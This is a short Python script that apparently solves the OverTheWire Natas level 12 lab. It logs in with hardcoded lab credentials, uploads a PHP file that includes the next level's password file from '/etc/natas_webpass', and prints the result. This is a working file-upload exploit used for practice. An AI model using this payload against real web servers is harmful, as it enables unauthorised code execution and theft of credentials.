import re
import requests

from requests.auth import HTTPBasicAuth

HOST = 'http://natas12.natas.labs.overthewire.org/'
php_payload = r'''<?php
    include("/etc/natas_webpass/natas13");
?>'''
files = {'uploadedfile': ('file.php', php_payload)}
data = dict(filename='filee.php')
auth = HTTPBasicAuth('natas12', 'EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3')

r = requests.post(HOST, auth=auth, files=files, data=data)
uploaded_file = re.findall('''(upload/\S{10}.php)''', r.content)[0]
print 'Uploaded file: ', uploaded_file
r = requests.get(HOST + uploaded_file, auth=auth)
print r.content